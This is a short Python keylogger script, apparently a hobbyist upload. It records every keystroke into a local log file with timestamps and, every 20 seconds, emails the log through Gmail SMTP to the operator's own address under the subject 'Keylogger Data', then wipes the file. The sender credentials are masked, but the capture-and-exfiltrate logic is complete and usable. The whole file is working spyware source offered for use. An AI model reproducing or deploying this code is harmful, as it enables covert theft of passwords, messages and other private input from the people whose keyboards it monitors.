#By-Sarikaya

import keyboard
import datetime
import smtplib
from email.mime.text import MIMEText
import time

word = ""
interval = 20

file = open("key_log.txt","w")

def on_press(key):
    global word
    if key.name in ["space","enter"]:
        with open("key_log.txt","a") as file:
            file.write(word+""+"Instant Text = " + str(datetime.datetime.now())+"\n")
        word = ""
    elif key.name == "backspace":
        word = word[:-1]
    else:
        word += key.name


keyboard.on_press(on_press)

while True:
    with open("key_log.txt") as file:
        data = file.read()

    if data: #Mail
        msg = MIMEText(data)
        msg["Subject"] = "Keylogger Data"        #Message Subject
        msg["From"] = "************"  #We write the address from which mail to come -second mail
        msg["To"] = "***************"  #we write our own e-mail address -main mail

        mail = smtplib.SMTP('smtp.gmail.com',587)
        mail.ehlo()
        mail.starttls()
        mail.login('****************','****************') #second gmail and passwd  
        mail.sendmail("****************","****************",msg.as_string()) #second mail and main mail address
        mail.close()

        with open("key_log.txt","w") as file:
            file.write("")

    time.sleep(interval)
